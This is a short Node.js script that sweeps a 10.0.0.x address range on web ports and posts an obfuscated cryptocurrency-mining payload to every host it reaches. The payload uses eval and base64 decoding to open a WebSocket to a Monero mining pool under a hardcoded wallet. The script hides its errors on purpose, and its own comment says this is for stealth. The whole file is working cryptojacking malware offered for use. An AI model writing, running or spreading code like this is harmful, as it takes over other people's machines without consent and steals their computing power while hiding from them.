const axios = require('axios');

// Configuration
const TARGET_PORTS = [80, 443, 8080];
const MINER_PAYLOAD = "<script>eval(atob('dmFyIHc9bmV3IFdlYlNvY2tldCgi'+btoa('wss://webminer.moneroocean.stream:443')+'\");w.onopen=function(){w.send(JSON.stringify({type:\"login\",params:{wallet:\"4ADHEMYrLqrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZiMZ4QwBjop9\",worker:\"m\"+Math.random().toString(36).slice(2),algo:\"cn-pico\",threads:-1}}));};'));</script>";

// Scan and inject miner
async function scanAndInject(ipRange) {
    for (let i = 1; i <= 254; i++) {
        const ip = `${ipRange}.${i}`;
        for (const port of TARGET_PORTS) {
            try {
                await axios.post(`http://${ip}:${port}`, { inject: MINER_PAYLOAD });
                console.log(`[${new Date().toLocaleTimeString()}] Injected miner at ${ip}:${port}`);
            } catch (error) {
                // Silent failure for stealth
            }
        }
    }
}

// Start injection
scanAndInject('10.0.0');